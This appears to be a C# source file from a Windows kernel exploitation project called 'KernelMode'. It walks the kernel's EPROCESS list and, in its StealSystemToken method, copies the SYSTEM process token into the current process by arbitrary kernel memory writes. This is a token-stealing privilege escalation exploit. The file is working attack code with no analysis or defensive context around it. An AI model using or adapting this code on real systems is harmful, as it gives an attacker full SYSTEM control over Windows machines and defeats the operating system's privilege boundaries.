// File: Utils/EprocessScanner.cs
// Project: KernelMode

using System;
using KernelMode.Providers;

namespace KernelMode.Utils
{
	public static class ProviderExtensions
	{
		public static ulong ReadQword(this IProvider provider, ulong address)
		{
			byte[] buffer = new byte[8];
			if (!provider.ReadMemory(address, buffer, buffer.Length))
				throw new Exception("ReadQword failed");
			return BitConverter.ToUInt64(buffer, 0);
		}

		public static int ReadInt(this IProvider provider, ulong address)
		{
			byte[] buffer = new byte[4];
			if (!provider.ReadMemory(address, buffer, buffer.Length))
				throw new Exception("ReadInt failed");
			return BitConverter.ToInt32(buffer, 0);
		}
	}

	public static class EprocessScanner
	{
		public static ulong FindEprocessByPid(IProvider provider, int pid)
		{
			ulong systemEproc = OffsetResolver.Resolve("PsInitialSystemProcess"); // placeholder key
			ulong listHead = provider.ReadQword(systemEproc + OffsetResolver.Resolve("ActiveProcessLinks"));
			ulong flink = listHead;
			int maxScan = 0x10000;

			while (maxScan-- > 0)
			{
				ulong entry = flink - OffsetResolver.Resolve("ActiveProcessLinks");
				int entryPid = provider.ReadInt(entry + OffsetResolver.Resolve("UniqueProcessId"));
				if (entryPid == pid)
					return entry;

				flink = provider.ReadQword(entry + OffsetResolver.Resolve("ActiveProcessLinks"));
				if (flink == listHead || flink == 0)
					break;
			}

			return 0;
		}

		public static bool StealSystemToken(IProvider provider)
		{
			Console.WriteLine("[*] Attempting SYSTEM token steal via EPROCESS scan...");

			// Simplified for demo — assumes known offsets for token & list
			ulong PsInitialSystemProcess = OffsetResolver.Resolve("PsInitialSystemProcess");
			ulong eprocListOffset = OffsetResolver.Resolve("ActiveProcessLinks");
			ulong tokenOffset = OffsetResolver.Resolve("Token");
			uint pidOffset = (uint)OffsetResolver.Resolve("UniqueProcessId");

			byte[] buf = new byte[8];

			ulong current = PsInitialSystemProcess;
			ulong systemToken = 0;
			ulong targetEproc = 0;

			for (int i = 0; i < 0x1000; i++)
			{
				provider.ReadMemory(current + pidOffset, buf, 4);
				uint pid = BitConverter.ToUInt32(buf, 0);

				if (pid == 4)
				{
					provider.ReadMemory(current + tokenOffset, buf, 8);
					systemToken = BitConverter.ToUInt64(buf, 0);
					Console.WriteLine("[+] Found SYSTEM token: 0x" + systemToken.ToString("X"));
				}

				provider.ReadMemory(current + eprocListOffset, buf, 8);
				ulong flink = BitConverter.ToUInt64(buf, 0);
				ulong next = flink - eprocListOffset;

				if (IsCurrentProcess(provider, next, pidOffset))
				{
					targetEproc = next;
					break;
				}

				if (next == PsInitialSystemProcess || next == 0 || next == current)
					break;

				current = next;
			}

			if (targetEproc != 0 && systemToken != 0)
			{
				provider.WriteMemory(targetEproc + tokenOffset, BitConverter.GetBytes(systemToken), 8);
				Console.WriteLine("[+] SYSTEM token copied to current process!");
				return true;
			}

			Console.WriteLine("[-] Failed to elevate privileges.");
			return false;
		}

		private static bool IsCurrentProcess(IProvider provider, ulong eproc, ulong pidOffset)
		{
			uint currentPid = (uint)System.Diagnostics.Process.GetCurrentProcess().Id;
			byte[] pidBuf = new byte[4];
			provider.ReadMemory(eproc + pidOffset, pidBuf, 4);
			return BitConverter.ToUInt32(pidBuf, 0) == currentPid;
		}
	}
}
